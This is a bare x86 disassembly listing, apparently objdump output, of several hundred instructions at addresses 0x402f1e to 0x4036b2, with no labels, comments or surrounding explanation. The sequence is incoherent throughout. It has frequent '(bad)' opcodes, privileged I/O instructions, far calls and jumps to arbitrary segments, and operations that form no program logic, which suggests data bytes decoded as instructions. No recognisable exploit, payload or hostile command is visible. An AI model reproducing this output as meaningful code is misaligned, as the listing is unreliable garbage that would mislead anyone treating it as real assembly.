  402f1e:	cmp    ebx,DWORD PTR [bx]
  402f21:	out    dx,al
  402f22:	jo     0x402f17
  402f24:	sub    al,0x9
  402f26:	stc    
  402f27:	test   BYTE PTR [edx],ch
  402f29:	(bad)  
  402f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f2b:	nop
  402f2c:	and    DWORD PTR [eax-0x22],edx
  402f2f:	ss or  BYTE PTR fs:[ebx],cl
  402f33:	aaa    
  402f34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f35:	sahf   
  402f36:	pop    edx
  402f37:	into   
  402f38:	mov    BYTE PTR [ebx-0x293de9f0],dh
  402f3e:	rol    DWORD PTR [ecx-0x18205cb3],cl
  402f44:	jmp    0x402fb7
  402f46:	xor    eax,0x7e006cf5
  402f4b:	push   esp
  402f4c:	cwde   
  402f4d:	mov    ds:0x8721b4ab,al
  402f52:	out    0xaf,eax
  402f54:	fwait
  402f55:	mov    dh,0x35
  402f57:	push   cs
  402f58:	sbb    eax,esi
  402f5a:	stos   BYTE PTR es:[edi],al
  402f5b:	gs in  al,dx
  402f5d:	and    BYTE PTR [edx+0x52be2f85],ch
  402f63:	or     BYTE PTR [edi+0x38],al
  402f66:	push   eax
  402f67:	push   ss
  402f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f69:	gs cdq 
  402f6b:	outs   dx,DWORD PTR ds:[esi]
  402f6c:	cmp    eax,0xd47eaf7c
  402f71:	in     eax,dx
  402f72:	out    dx,al
  402f73:	adc    BYTE PTR ss:[edi],0xda
  402f77:	push   0xffffffe9
  402f79:	ss ins BYTE PTR es:[edi],dx
  402f7b:	in     eax,dx
  402f7c:	sub    BYTE PTR [ebx-0x3b0bbdcc],al
  402f82:	add    DWORD PTR [ecx],eax
  402f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f85:	stc    
  402f86:	xchg   ebp,eax
  402f87:	jb     0x402f70
  402f89:	xlat   BYTE PTR ds:[ebx]
  402f8a:	xlat   BYTE PTR ds:[ebx]
  402f8b:	pop    ebp
  402f8c:	mov    esi,0x9e05aa23
  402f91:	cmp    BYTE PTR [ecx+ecx*2+0x3d],dh
  402f95:	xchg   DWORD PTR [eax],ebx
  402f97:	and    eax,0x4f7c5304
  402f9c:	pop    edi
  402f9d:	sbb    BYTE PTR [edi-0x54],bh
  402fa0:	dec    esp
  402fa1:	xchg   edx,eax
  402fa2:	das    
  402fa3:	stos   DWORD PTR es:[edi],eax
  402fa4:	shr    BYTE PTR [ecx],1
  402fa6:	mov    ecx,0xe32c41f7
  402fab:	fistp  QWORD PTR [esi+0x3479410a]
  402fb1:	adc    edx,DWORD PTR [eax]
  402fb3:	cs popa 
  402fb5:	mov    ebp,0xb0624264
  402fba:	jle    0x402fc9
  402fbc:	or     DWORD PTR [eax-0x3],esp
  402fbf:	fcomp  QWORD PTR [eax]
  402fc1:	mov    ebx,DWORD PTR [ecx]
  402fc3:	add    al,0x59
  402fc5:	mov    ebp,0x903f0d8a
  402fca:	scas   eax,DWORD PTR es:[edi]
  402fcb:	jp     0x35fc9528
  402fd1:	sub    dl,dh
  402fd3:	outs   dx,BYTE PTR ds:[esi]
  402fd4:	cwde   
  402fd5:	add    BYTE PTR [ebp+0x422d7cec],ch
  402fdb:	mov    dl,0xa9
  402fdd:	repnz int 0x28
  402fe0:	push   es
  402fe1:	inc    eax
  402fe2:	nop
  402fe3:	out    dx,eax
  402fe4:	dec    eax
  402fe5:	cwde   
  402fe6:	jb     0x402f74
  402fe8:	or     esp,ecx
  402fea:	(bad)  
  402fec:	(bad)
  402fef:	mov    esi,0xf2fce9bf
  402ff4:	cmp    ebp,DWORD PTR [ecx-0x34]
  402ff7:	sbb    eax,0x2ce9c8a5
  402ffc:	mov    dh,0xcd
  402ffe:	xchg   ecx,eax
  402fff:	xchg   ebp,eax
  403000:	push   es
  403001:	test   BYTE PTR [edx-0x347210b8],dl
  403007:	into   
  403008:	cmp    DWORD PTR [eax+0x448a51e0],esi
  40300e:	ret    0xa9d
  403011:	fnsave ds:0xb5a767d7
  403017:	or     DWORD PTR [eax+0x47],esi
  40301a:	inc    esi
  40301b:	cld    
  40301c:	(bad)  
  40301d:	ja     0x40304c
  40301f:	xchg   esp,eax
  403020:	rcr    edi,1
  403022:	cld    
  403023:	inc    esp
  403024:	fs push 0xffffffaa
  403027:	inc    esi
  403028:	icebp  
  403029:	test   DWORD PTR [esi+0x335d11ee],edx
  40302f:	stos   BYTE PTR es:[edi],al
  403030:	sub    ebp,DWORD PTR [esp+ebp*8]
  403033:	fisub  DWORD PTR [eax+0x7713c6bb]
  403039:	mov    ds:0x9bbc2df3,eax
  40303e:	and    eax,0x767e363d
  403043:	stos   DWORD PTR es:[edi],eax
  403044:	xchg   edi,eax
  403045:	cwde   
  403046:	mov    ds:0x2cb9d3eb,al
  40304b:	sub    al,0x6
  40304d:	mov    al,0xa3
  40304f:	push   0x30f6de80
  403054:	sbb    dh,BYTE PTR [di+0x4]
  403058:	push   eax
  403059:	pop    es
  40305a:	mov    cl,0x96
  40305c:	add    DWORD PTR cs:[ebx+0x2e],ebx
  403060:	push   0x7f
  403062:	popf   
  403063:	(bad)  
  403064:	xor    DWORD PTR [esi],esp
  403066:	pop    ecx
  403067:	sub    ebx,DWORD PTR [ecx+0x20]
  40306a:	cmc    
  40306b:	xor    edi,DWORD PTR [eax-0x5589996a]
  403071:	test   DWORD PTR [ebx-0x7a7449ed],0xf93eaa61
  40307b:	and    DWORD PTR [edi+0xe],edi
  40307e:	not    esp
  403080:	cld    
  403081:	xlat   BYTE PTR ds:[ebx]
  403082:	js     0x4030f8
  403084:	and    DWORD PTR [esi+0x439a63c6],ebx
  40308a:	frstor [ebp+0x4b]
  40308d:	scas   eax,DWORD PTR es:[edi]
  40308e:	and    al,0xd3
  403090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403091:	pop    ds
  403092:	xchg   cx,ax
  403094:	imul   DWORD PTR [eax-0x64]
  403097:	test   BYTE PTR [esi-0x4e],bl
  40309a:	push   esp
  40309b:	ficom  DWORD PTR [esp+ecx*8]
  40309e:	cmp    BYTE PTR [edi],bh
  4030a0:	or     BYTE PTR [eax+0xd],ah
  4030a3:	xlat   BYTE PTR ds:[ebx]
  4030a4:	bound  edi,QWORD PTR [edi*1-0x9025dad]
  4030ab:	dec    edx
  4030ac:	in     eax,0xb9
  4030ae:	adc    dl,BYTE PTR [edx+ebp*4]
  4030b1:	dec    ecx
  4030b2:	pop    ebx
  4030b3:	xor    eax,0xb2c710a9
  4030b8:	sbb    BYTE PTR [esp+ecx*4-0x59],bl
  4030bc:	loope  0x4030cb
  4030be:	sub    al,0x56
  4030c0:	xchg   edi,eax
  4030c1:	jge    0x403107
  4030c3:	fisttp WORD PTR [edx+0x2c]
  4030c6:	out    0x42,al
  4030c8:	sub    dh,bh
  4030ca:	cmp    eax,0x2952e105
  4030cf:	xchg   edi,eax
  4030d0:	dec    ecx
  4030d1:	pusha  
  4030d2:	mov    WORD PTR [eax],ss
  4030d4:	lahf   
  4030d5:	mov    ebp,0xe4fef6d3
  4030da:	(bad)  
  4030db:	into   
  4030dc:	sub    eax,0x2e71737d
  4030e1:	sub    ah,BYTE PTR [ebx]
  4030e3:	xchg   DWORD PTR [eax-0x1d],eax
  4030e6:	ror    DWORD PTR [eax+ebx*1+0x64691985],0xdf
  4030ee:	and    DWORD PTR [ebx+0x142c8748],0x547e8389
  4030f8:	or     al,0xa9
  4030fa:	mov    ebp,ss
  4030fc:	jns    0x4030af
  4030fe:	out    dx,eax
  4030ff:	push   DWORD PTR [ebx+0x741bfd1d]
  403105:	dec    ebp
  403106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403107:	ja     0x403133
  403109:	cmc    
  40310a:	jge    0x403099
  40310c:	and    cl,ch
  40310e:	mov    ebx,ebp
  403110:	sar    BYTE PTR [eax-0xa],cl
  403113:	xchg   DWORD PTR [eax+ecx*2-0x4255ae94],edi
  40311a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40311b:	cmp    dl,BYTE PTR [ebx]
  40311d:	xlat   BYTE PTR ds:[ebx]
  40311e:	icebp  
  40311f:	or     eax,0x91add89f
  403124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403125:	cdq    
  403126:	or     al,0x95
  403128:	adc    ebp,DWORD PTR [esi*8-0x108aa3cd]
  40312f:	cdq    
  403130:	sub    esp,DWORD PTR [eax+0x5f]
  403133:	cmp    DWORD PTR [ecx+0x788830cc],esp
  403139:	mov    dl,0xf5
  40313b:	addr16 xor eax,0x89f99d48
  403141:	xor    BYTE PTR [ecx+0xf],bl
  403144:	mov    edi,0x56738d49
  403149:	and    al,0x58
  40314b:	ror    DWORD PTR [edi],0x9
  40314e:	inc    edi
  40314f:	mov    WORD PTR [ebp-0x42],fs
  403152:	int3   
  403153:	and    BYTE PTR [edx],ah
  403155:	dec    ebp
  403156:	pop    eax
  403157:	mov    esi,0xe1452164
  40315c:	aad    0xb0
  40315e:	enter  0x557c,0xc1
  403162:	int3   
  403163:	jecxz  0x4031d8
  403165:	outs   dx,BYTE PTR ds:[esi]
  403166:	xchg   BYTE PTR [eax],dh
  403168:	pop    es
  403169:	test   eax,0xbe813357
  40316f:	cmp    BYTE PTR [ebx],bl
  403171:	dec    ebx
  403172:	mov    ebp,0xee3433f7
  403177:	mov    ds:0x3dd83641,al
  40317c:	or     BYTE PTR [eax],0xe6
  40317f:	gs ss xchg ebp,eax
  403182:	ret    
  403183:	das    
  403184:	imul   esp,DWORD PTR [ecx+0x7eff737e],0x1a18694b
  40318e:	push   es
  40318f:	adc    al,0x72
  403191:	nop
  403192:	data16 jnp 0x4031ff
  403195:	addr16 aam 0x9d
  403198:	sbb    ebx,esp
  40319a:	imul   ebx,DWORD PTR [edi],0xe459466e
  4031a0:	mov    ecx,DWORD PTR [eax-0x7455044]
  4031a6:	pop    ss
  4031a7:	inc    esp
  4031a8:	pop    edi
  4031a9:	lock imul edi,DWORD PTR [eax+0xd],0xffffff8c
  4031ae:	hlt    
  4031af:	fst    QWORD PTR [edx]
  4031b1:	and    BYTE PTR [edi],0xdf
  4031b4:	mov    cl,0x90
  4031b6:	movlhps xmm5,xmm0
  4031b9:	xchg   esi,eax
  4031ba:	(bad)  
  4031bb:	push   cs
  4031bc:	stos   DWORD PTR es:[edi],eax
  4031bd:	xor    DWORD PTR [edx],esi
  4031bf:	xchg   ebp,eax
  4031c0:	(bad)  
  4031c2:	sub    ch,ah
  4031c4:	inc    ecx
  4031c5:	push   ss
  4031c6:	aad    0x5d
  4031c8:	cld    
  4031c9:	test   DWORD PTR [ecx+0x5],ebx
  4031cc:	shr    ebx,cl
  4031ce:	iret   
  4031cf:	xor    DWORD PTR [eax+0x7c],ecx
  4031d2:	loope  0x4031d5
  4031d4:	stos   BYTE PTR es:[edi],al
  4031d5:	sub    DWORD PTR [edx],esi
  4031d7:	cmp    eax,0x2fdfd780
  4031dc:	push   esp
  4031dd:	(bad)  
  4031de:	icebp  
  4031df:	jge    0x403197
  4031e1:	jp     0x40316b
  4031e3:	test   BYTE PTR [ecx+esi*1+0x2079b2a3],dh
  4031ea:	iret   
  4031eb:	sub    BYTE PTR ds:0x9c48f4f1,dl
  4031f1:	ja     0x4031cf
  4031f3:	out    0x77,al
  4031f5:	push   0x17
  4031f7:	xchg   ecx,eax
  4031f8:	ja     0x40325b
  4031fa:	mov    cs,WORD PTR [eax*4-0x3df744b9]
  403201:	jmp    0x403232
  403203:	js     0x40321c
  403205:	adc    ch,BYTE PTR [ecx+0x18]
  403208:	dec    esi
  403209:	(bad)  
  40320b:	xor    bh,BYTE PTR [edx-0x605e879c]
  403211:	mov    ah,dl
  403213:	(bad)  
  403217:	or     ch,BYTE PTR [ebx+0x791c2d1]
  40321d:	mov    cl,0x90
  40321f:	dec    ebp
  403220:	dec    esi
  403221:	inc    edi
  403222:	data16 fidiv DWORD PTR [ecx+0x8c9da45]
  403229:	and    al,0xdc
  40322b:	mov    DWORD PTR [ebx],esi
  40322d:	cmovg  esp,ebp
  403230:	xchg   ebp,eax
  403231:	pop    ecx
  403232:	sub    BYTE PTR [eax],bl
  403234:	push   edx
  403235:	fwait
  403236:	sbb    BYTE PTR [ebx],ah
  403238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40323a:	add    BYTE PTR [eax],dh
  40323c:	(bad)  
  40323d:	jbe    0x403254
  40323f:	js     0x40320b
  403241:	mov    eax,ds:0x109e20e7
  403246:	jae    0x4031fb
  403248:	loopne 0x40322e
  40324a:	lock cmp al,0x57
  40324d:	call   0x43ef:0xe56c9ce6
  403254:	inc    esi
  403255:	(bad)  
  403256:	lock jle 0x40320d
  403259:	std    
  40325a:	loope  0x40321b
  40325c:	mov    edx,0xd954282
  403261:	je     0x403200
  403263:	xchg   edx,eax
  403264:	pop    edi
  403265:	mov    edx,DWORD PTR [esi]
  403267:	ins    BYTE PTR es:[edi],dx
  403268:	jmp    0x1c30:0x578b5ecf
  40326f:	push   edx
  403270:	out    0xd9,al
  403272:	arpl   si,bx
  403274:	inc    ecx
  403275:	cmc    
  403276:	loope  0x403262
  403278:	sub    DWORD PTR [esi],ebp
  40327a:	or     eax,0x56102c40
  40327f:	mov    eax,ds:0xeafaece4
  403284:	js     0x403228
  403286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403287:	push   edi
  403288:	fisubr WORD PTR [ebp-0x18]
  40328b:	push   ebx
  40328c:	test   DWORD PTR [eax-0x23],0x3dc73e97
  403293:	stos   BYTE PTR es:[edi],al
  403294:	sbb    al,0xe7
  403296:	pop    eax
  403297:	mov    ds:0x746348f,eax
  40329c:	enter  0x67a6,0xa7
  4032a0:	in     eax,0xb5
  4032a2:	imul   esi,DWORD PTR ds:0x10dc8e74,0xffffff85
  4032a9:	pop    esp
  4032aa:	push   ebp
  4032ab:	jmp    0x403271
  4032ad:	adc    BYTE PTR [ebp+0x4],ch
  4032b0:	test   eax,0xba8bfce8
  4032b5:	dec    edx
  4032b6:	hlt    
  4032b7:	std    
  4032b8:	pmulhuw mm0,QWORD PTR [ebp-0x3ff580ac]
  4032bf:	lods   eax,DWORD PTR ds:[esi]
  4032c0:	mov    al,0x31
  4032c2:	das    
  4032c3:	jle    0x40328d
  4032c5:	pop    ebp
  4032c6:	into   
  4032c7:	shl    WORD PTR [esi],1
  4032ca:	push   ds
  4032cb:	jle    0x40325a
  4032cd:	into   
  4032ce:	jmp    0xbf4f43b2
  4032d3:	leave  
  4032d4:	(bad)  
  4032d5:	mov    bh,0x33
  4032d7:	jge    0x403333
  4032d9:	jge    0x4032d2
  4032db:	lods   eax,DWORD PTR ds:[esi]
  4032dc:	xchg   ecx,eax
  4032dd:	jo     0x4032a4
  4032df:	das    
  4032e0:	sub    bl,BYTE PTR [esi+edx*1-0x4f]
  4032e4:	push   esp
  4032e5:	pop    ebp
  4032e6:	in     eax,0x91
  4032e8:	pop    ss
  4032e9:	sub    bh,BYTE PTR [eax+eiz*2+0x21]
  4032ed:	cmp    al,0xeb
  4032ef:	in     eax,0x48
  4032f1:	or     esi,DWORD PTR [edx+0x76]
  4032f4:	jmp    0x403326
  4032f6:	sub    DWORD PTR [ebx+ebp*1-0x1],edx
  4032fa:	clc    
  4032fb:	pop    eax
  4032fc:	pop    esi
  4032fd:	retf   
  4032fe:	push   eax
  4032ff:	loope  0x40336f
  403301:	scas   al,BYTE PTR es:[edi]
  403302:	call   0x981e:0x9d5612d7
  403309:	fidivr DWORD PTR [edi-0x50183a68]
  40330f:	jmp    0x403331
  403311:	jae    0x4032cf
  403313:	sbb    ah,BYTE PTR [ecx-0x16]
  403316:	cli    
  403317:	cld    
  403318:	sahf   
  403319:	inc    esi
  40331a:	push   ecx
  40331b:	aad    0x71
  40331d:	and    DWORD PTR [eax+0x6ca6c497],ebp
  403323:	dec    ebx
  403324:	mov    ds:0x311b712a,eax
  403329:	jb     0x4033a5
  40332b:	cmp    DWORD PTR [ecx+0x63],edx
  40332e:	and    ebp,DWORD PTR [eax+0x79]
  403331:	push   esi
  403332:	push   0x23
  403334:	and    ecx,DWORD PTR [ebp+ebp*4-0x1f]
  403338:	fild   DWORD PTR [ebx-0x7e]
  40333b:	add    BYTE PTR [esi+0x54adc91b],dh
  403341:	push   eax
  403342:	add    DWORD PTR [ebx-0x4d2fb70c],edx
  403348:	jl     0x40335a
  40334a:	scas   al,BYTE PTR es:[edi]
  40334b:	sbb    DWORD PTR [edx-0x5d0be686],esi
  403351:	outs   dx,BYTE PTR ds:[esi]
  403352:	lods   al,BYTE PTR ds:[esi]
  403353:	popa   
  403354:	adc    cl,BYTE PTR [edi]
  403356:	(bad)
  403359:	popf   
  40335a:	jnp    0x403397
  40335c:	mov    edi,0x5d738b6a
  403361:	aad    0xdd
  403363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403364:	mov    dh,0x2b
  403367:	pop    ss
  403368:	mov    edx,DWORD PTR [edi+0x38f99c9a]
  40336e:	test   eax,0x9b397dd9
  403373:	jmp    0x928f794a
  403378:	dec    eax
  403379:	sar    DWORD PTR [ecx-0xe],cl
  40337c:	push   esi
  40337d:	push   es
  40337e:	ror    DWORD PTR [esi-0x7af465a6],0x75
  403385:	pushf  
  403386:	sub    bh,BYTE PTR [eax]
  403388:	and    bl,BYTE PTR [ebx+0x46bcf601]
  40338e:	pop    ss
  40338f:	js     0x4033d2
  403391:	xor    al,0xf7
  403393:	push   esp
  403394:	push   cs
  403395:	sbb    DWORD PTR [ebx-0x53e08805],ecx
  40339b:	rcl    BYTE PTR [edi+0x2c51a566],cl
  4033a1:	in     eax,dx
  4033a2:	and    ah,al
  4033a4:	ins    DWORD PTR es:[edi],dx
  4033a5:	mov    ebp,0xb43f6ac5
  4033aa:	jge    0x403362
  4033ac:	popa   
  4033ad:	sti    
  4033ae:	mov    dh,0x1d
  4033b0:	popf   
  4033b1:	or     BYTE PTR [ebx-0x2517abb2],bl
  4033b7:	pop    esp
  4033b8:	add    al,0xa3
  4033ba:	push   0xffffff9c
  4033bc:	int3   
  4033bd:	jns    0x4033bd
  4033bf:	mov    esi,0xce3f9e9a
  4033c4:	daa    
  4033c5:	xchg   ch,ch
  4033c7:	ficom  WORD PTR [eax+0x55]
  4033ca:	push   ss
  4033cb:	dec    edi
  4033cc:	(bad)  
  4033cd:	test   BYTE PTR [esi+ebp*1],0xc6
  4033d1:	dec    ecx
  4033d2:	and    al,0xfd
  4033d4:	inc    eax
  4033d5:	cmp    DWORD PTR [eax],ebx
  4033d7:	shl    BYTE PTR [esi],0xae
  4033da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033db:	mov    edi,0x270ebf06
  4033e0:	call   0xb38267f0
  4033e5:	xchg   ebx,eax
  4033e6:	popf   
  4033e7:	xchg   ebp,eax
  4033e8:	in     eax,dx
  4033e9:	mov    dh,0x27
  4033eb:	fsub   st(2),st
  4033ed:	in     eax,dx
  4033ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033ef:	mov    ebx,DWORD PTR [edi]
  4033f1:	mov    BYTE PTR [ecx+0x7c],bl
  4033f4:	dec    esp
  4033f5:	jge    0x403424
  4033f7:	lods   al,BYTE PTR ds:[esi]
  4033f8:	push   ss
  4033f9:	out    0xa7,eax
  4033fb:	scas   al,BYTE PTR es:[edi]
  4033fc:	in     eax,dx
  4033fd:	inc    ecx
  4033fe:	addr16 xchg edx,eax
  403400:	and    DWORD PTR [ecx],0x1
  403403:	cmp    al,0x23
  403405:	mov    ebp,0xf30cc649
  40340a:	fwait
  40340b:	out    0xbc,al
  40340d:	test   eax,0x1ce7e369
  403412:	add    cl,BYTE PTR [ebx+0x3d]
  403415:	call   0x4fd0:0x5e954951
  40341c:	xor    esp,DWORD PTR gs:[bp+si]
  403420:	xchg   ebx,eax
  403421:	jecxz  0x40345d
  403423:	inc    edi
  403424:	lock fldenv [ecx]
  403427:	lahf   
  403428:	stc    
  403429:	jno    0x40349d
  40342b:	nop
  40342c:	sbb    dh,BYTE PTR [ecx]
  40342e:	fwait
  40342f:	sbb    al,0x49
  403431:	dec    esi
  403432:	lahf   
  403433:	or     BYTE PTR [ecx+0x4f],ch
  403436:	mov    BYTE PTR [esi],cl
  403438:	adc    al,0x3c
  40343a:	or     al,0xa0
  40343c:	or     eax,0x19f68a99
  403441:	mov    BYTE PTR [edi],cl
  403443:	dec    edi
  403444:	iret   
  403445:	aas    
  403446:	in     eax,dx
  403447:	jne    0x403403
  403449:	in     al,dx
  40344a:	lahf   
  40344b:	xlat   BYTE PTR ds:[ebx]
  40344c:	inc    ecx
  40344d:	push   0x3d
  40344f:	popf   
  403450:	xchg   DWORD PTR [ecx-0x1aa760f8],esi
  403456:	jl     0x403423
  403458:	mov    ah,0xb0
  40345a:	mov    ch,0xb
  40345c:	mov    eax,DWORD PTR [esi+0x6d]
  40345f:	push   0xb69f2051
  403464:	mov    edx,0xb20dee87
  403469:	in     al,0xa1
  40346b:	or     bl,BYTE PTR [edx-0x13]
  40346e:	(bad)  
  403470:	mov    esp,0x7baa0bf8
  403475:	and    al,0x2c
  403477:	shr    BYTE PTR [ecx-0x6c491183],1
  40347d:	test   al,0xd
  40347f:	pop    edx
  403480:	adc    ebp,DWORD PTR [edx+0x69d07329]
  403486:	mov    dh,0x84
  403488:	hlt    
  403489:	xchg   esi,eax
  40348a:	push   edx
  40348b:	(bad)  
  40348c:	adc    eax,0x91c5b26d
  403491:	dec    ebp
  403492:	jns    0x4034cd
  403494:	sbb    bl,BYTE PTR [ecx]
  403496:	and    BYTE PTR [ebx+0x6a],bh
  403499:	push   eax
  40349a:	mov    edx,0xa561da3a
  40349f:	test   cl,0x52
  4034a2:	in     al,0xf2
  4034a4:	stos   BYTE PTR es:[edi],al
  4034a5:	das    
  4034a6:	popa   
  4034a7:	and    BYTE PTR ds:0x1a23da25,dl
  4034ad:	mov    esp,0x8e884132
  4034b2:	add    esp,DWORD PTR [edi+esi*1]
  4034b5:	adc    eax,0xe307cb7d
  4034ba:	xchg   DWORD PTR [edi+0x6f2c02e5],edx
  4034c0:	inc    edx
  4034c1:	mov    ebp,0x4138fd30
  4034c6:	pop    esp
  4034c7:	mov    bh,0x53
  4034c9:	outs   dx,DWORD PTR ds:[esi]
  4034ca:	mov    dl,0x5d
  4034cc:	cdq    
  4034cd:	retf   0x866e
  4034d0:	cmp    cl,cl
  4034d2:	aas    
  4034d3:	fcmovnb st,st(7)
  4034d5:	outs   dx,DWORD PTR ds:[esi]
  4034d6:	xor    bl,BYTE PTR [esi]
  4034d8:	or     al,0x10
  4034da:	xor    eax,0xb6b15752
  4034df:	sub    BYTE PTR [esi+0x630b0bda],dl
  4034e5:	inc    ecx
  4034e6:	and    bh,dl
  4034e8:	mov    dl,0xd3
  4034ea:	mov    ecx,0x3409b69d
  4034ef:	call   FWORD PTR [eax+ebx*4+0x13]
  4034f3:	push   0x289f1b6f
  4034f8:	mov    ds:0x8be1bea0,al
  4034fd:	imul   esi,DWORD PTR ds:0x64ec57fb,0x7dc11ea2
  403507:	push   esi
  403508:	fdivp  st(6),st
  40350a:	xor    ebp,0x2b564f7
  403510:	fist   WORD PTR [edi-0x4d05ad10]
  403516:	mov    ebx,0xe6d69839
  40351b:	ins    DWORD PTR es:[edi],dx
  40351c:	inc    ebp
  40351d:	in     al,0x3e
  40351f:	mov    dh,0xce
  403521:	push   cs
  403522:	ins    DWORD PTR es:[edi],dx
  403523:	dec    esi
  403524:	sbb    eax,0x2d1f86e
  403529:	push   ds
  40352a:	ja     0x40352f
  40352c:	pop    es
  40352d:	pushf  
  40352e:	and    cl,BYTE PTR [edx+eax*1-0x3c]
  403532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403533:	js     0x403576
  403535:	fild   QWORD PTR [eax]
  403537:	stos   BYTE PTR es:[edi],al
  403538:	fidivr WORD PTR [esi-0x72]
  40353b:	(bad)  
  40353c:	cmp    DWORD PTR [ebx+0x33],ebx
  40353f:	rcl    DWORD PTR [ebx],cl
  403541:	repnz das 
  403543:	test   DWORD PTR [esi+0xfd8bfcb],ebx
  403549:	or     eax,0xe1cd366
  40354e:	jno    0x40358f
  403550:	imul   esi,esp,0x8
  403553:	das    
  403554:	jg     0x4034f6
  403556:	pop    esi
  403557:	push   eax
  403558:	mov    esp,0xcf116592
  40355d:	pop    ebp
  40355e:	push   ecx
  403560:	mov    eax,0xcaa1f8f8
  403565:	pop    esi
  403566:	outs   dx,BYTE PTR ds:[esi]
  403567:	xor    BYTE PTR [edx+0x10],0x81
  40356b:	shr    BYTE PTR [ebp+0x3c],1
  40356e:	push   edi
  40356f:	retf   0xb074
  403572:	cmp    ecx,DWORD PTR [ecx+edx*4]
  403575:	sub    BYTE PTR [ebp+ecx*4+0x48897eb8],bl
  40357c:	pushf  
  40357d:	jp     0x4035bf
  40357f:	cmc    
  403580:	add    cl,bh
  403582:	pusha  
  403583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403584:	mov    ah,0xdd
  403586:	fidiv  DWORD PTR [ebx+ebp*2+0x56]
  40358a:	cmp    ecx,DWORD PTR [ebp+0x41]
  40358d:	jmp    0x80b37df3
  403592:	jmp    0x4035dc
  403594:	repz xor DWORD PTR [ecx],0x9767cf17
  40359b:	outs   dx,BYTE PTR ds:[esi]
  40359c:	fcmovbe st,st(3)
  40359e:	lea    edx,[esi]
  4035a0:	xchg   edi,eax
  4035a1:	push   ebx
  4035a2:	inc    ebp
  4035a3:	in     eax,dx
  4035a4:	ja     0x403594
  4035a6:	push   cs
  4035a7:	in     al,0x63
  4035a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035aa:	imul   edx,DWORD PTR [edi+0x412233d5],0x2926a44a
  4035b4:	ret    0x9a34
  4035b7:	mov    al,0xee
  4035b9:	(bad)  
  4035ba:	xchg   ecx,eax
  4035bb:	jmp    0x5d03cc03
  4035c0:	jo     0x40363a
  4035c2:	(bad)  
  4035c4:	scas   al,BYTE PTR es:[edi]
  4035c5:	arpl   sp,si
  4035c7:	(bad)  
  4035c8:	test   BYTE PTR [ecx+0x4f53d850],bl
  4035ce:	mov    edx,0xbe977204
  4035d3:	retf   0xa705
  4035d6:	xor    eax,0xbff36eb2
  4035db:	cwde   
  4035dc:	(bad)  
  4035dd:	out    0x8b,eax
  4035df:	rcl    DWORD PTR [ecx+0x5c7c3f2d],cl
  4035e5:	xchg   ecx,eax
  4035e6:	in     eax,dx
  4035e7:	push   cs
  4035e8:	ins    BYTE PTR es:[edi],dx
  4035e9:	enter  0x7674,0xb7
  4035ed:	(bad)  
  4035ee:	adc    BYTE PTR [eax],bh
  4035f0:	xchg   esp,eax
  4035f1:	and    DWORD PTR [ebx-0x76],0xffffffee
  4035f5:	mov    ebx,0xb60a64ea
  4035fa:	aad    0xe1
  4035fc:	js     0x403631
  4035fe:	jge    0x403600
  403600:	fild   WORD PTR ds:0x3eb1dc93
  403606:	cmp    BYTE PTR [ebx+0x8],bh
  403609:	or     eax,0xc35c4eb7
  40360e:	popa   
  40360f:	lahf   
  403610:	lock stos DWORD PTR es:[edi],eax
  403612:	shl    esi,1
  403614:	loope  0x4035bd
  403616:	lahf   
  403617:	jecxz  0x4035fb
  403619:	in     eax,0xae
  40361b:	(bad)  
  40361c:	test   eax,0xd2038108
  403621:	neg    BYTE PTR [ebx+0x16acb85]
  403627:	std    
  403628:	ficom  WORD PTR [eax+eax*8]
  40362b:	ss hlt 
  40362d:	xchg   esi,eax
  40362e:	adc    DWORD PTR [edx+0x2a],ebx
  403631:	in     al,dx
  403632:	out    dx,al
  403633:	cmp    eax,0xd78011f0
  403638:	ss inc edi
  40363a:	add    ebx,0xf4c5f9c1
  403640:	dec    edi
  403641:	sub    BYTE PTR ds:0xa3b59e21,dl
  403647:	and    edx,DWORD PTR [edx+0x7f]
  40364a:	inc    edi
  40364b:	xchg   esp,eax
  40364c:	sub    DWORD PTR [ecx+0x28],eax
  40364f:	add    al,0x77
  403651:	daa    
  403652:	jg     0x4035e1
  403654:	ja     0x4036ac
  403656:	leave  
  403657:	repnz (bad) 
  40365a:	or     al,BYTE PTR [eax+0x7b1f17f2]
  403660:	cmp    eax,0x26eca3f7
  403665:	int3   
  403666:	jge    0x4035ff
  403668:	push   ebp
  403669:	pop    esp
  40366a:	repnz dec edi
  40366c:	jnp    0x403649
  40366e:	ret    
  40366f:	dec    ebx
  403670:	mov    BYTE PTR [edx-0x4290c082],bl
  403676:	xor    al,0xe7
  403678:	and    al,0x9b
  40367a:	adc    al,0x3
  40367c:	mov    ch,0x10
  40367e:	pop    es
  40367f:	jne    0x4036bd
  403681:	retf   
  403682:	jp     0x40368d
  403684:	ja     0x4036d7
  403686:	sbb    ecx,esi
  403688:	mov    bl,0x3a
  40368a:	mov    edx,0xdef50b74
  40368f:	mov    esp,0x7e60efee
  403694:	cmp    al,dh
  403696:	inc    esp
  403697:	xchg   ebp,eax
  403698:	xlat   BYTE PTR ds:[ebx]
  403699:	sub    eax,0x35541788
  40369e:	and    edx,DWORD PTR [edx+0x59]
  4036a1:	lods   al,BYTE PTR ds:[esi]
  4036a2:	or     esp,edx
  4036a4:	xchg   DWORD PTR [edi],edi
  4036a6:	mov    bh,0x83
  4036a8:	dec    edi
  4036a9:	pop    es
  4036aa:	arpl   WORD PTR [esi],di
  4036ac:	stos   BYTE PTR es:[edi],al
  4036ad:	fs xchg ebx,eax
  4036af:	push   esi
  4036b0:	pop    edx
  4036b1:	(bad)  
  4036b2:	ror    BYTE PTR [esi],cl
